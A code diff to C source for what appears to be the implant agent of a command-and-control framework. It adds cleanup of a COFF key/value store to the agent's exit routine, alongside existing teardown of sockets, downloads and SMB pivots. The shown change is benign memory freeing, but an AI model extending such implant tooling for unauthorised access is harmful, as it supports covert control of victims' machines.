@@ -3282,21 +3282,23 @@ VOID CommandExit( PPARSER Parser )
 
     /* default is 1 == exit thread.
      * TODO: make an config that holds the default exit method */
-    UINT32           ExitMethod    = 1;
-    PPACKAGE         Package       = NULL;
-    CONTEXT          RopExit       = { 0 };
-    LPVOID           ImageBase     = NULL;
-    SIZE_T           ImageSize     = 0;
-    PJOB_DATA        JobList       = Instance.Jobs;
-    DWORD            JobID         = 0;
-    PSOCKET_DATA     SocketList    = Instance.Sockets;
-    PSOCKET_DATA     SocketEntry   = NULL;
-    PDOWNLOAD_DATA   DownloadList  = Instance.Downloads;
-    PDOWNLOAD_DATA   DownloadEntry = NULL;
-    PMEM_FILE        MemFileList   = Instance.MemFiles;
-    PMEM_FILE        MemFileEntry  = NULL;
-    PPIVOT_DATA      SmbPivotList  = Instance.SmbPivots;
-    PPIVOT_DATA      SmbPivotEntry = NULL;
+    UINT32            ExitMethod    = 1;
+    PPACKAGE          Package       = NULL;
+    CONTEXT           RopExit       = { 0 };
+    LPVOID            ImageBase     = NULL;
+    SIZE_T            ImageSize     = 0;
+    PJOB_DATA         JobList       = Instance.Jobs;
+    DWORD             JobID         = 0;
+    PSOCKET_DATA      SocketList    = Instance.Sockets;
+    PSOCKET_DATA      SocketEntry   = NULL;
+    PDOWNLOAD_DATA    DownloadList  = Instance.Downloads;
+    PDOWNLOAD_DATA    DownloadEntry = NULL;
+    PMEM_FILE         MemFileList   = Instance.MemFiles;
+    PMEM_FILE         MemFileEntry  = NULL;
+    PPIVOT_DATA       SmbPivotList  = Instance.SmbPivots;
+    PPIVOT_DATA       SmbPivotEntry = NULL;
+    PCOFFEE_KEY_VALUE KeyValueList  = Instance.CoffeKeyValueStore;
+    PCOFFEE_KEY_VALUE KeyValueEntry = NULL;
 
     if ( Parser )
     {
@@ -3386,9 +3388,22 @@ VOID CommandExit( PPARSER Parser )
         }
 
         SmbPivotEntry = SmbPivotList;
-        SmbPivotList = SmbPivotList->Next;
+        SmbPivotList  = SmbPivotList->Next;
 
         PivotRemove( SmbPivotEntry->DemonID );
+    }
+
+    // free all key/values from COFFs
+    for ( ;; )
+    {
+        if ( ! KeyValueList ) {
+            break;
+        }
+
+        KeyValueEntry = KeyValueList;
+        KeyValueList  = KeyValueList->Next;
+
+        DATA_FREE( KeyValueEntry, sizeof( COFFEE_KEY_VALUE ) );
     }
 
     // stop impersonating
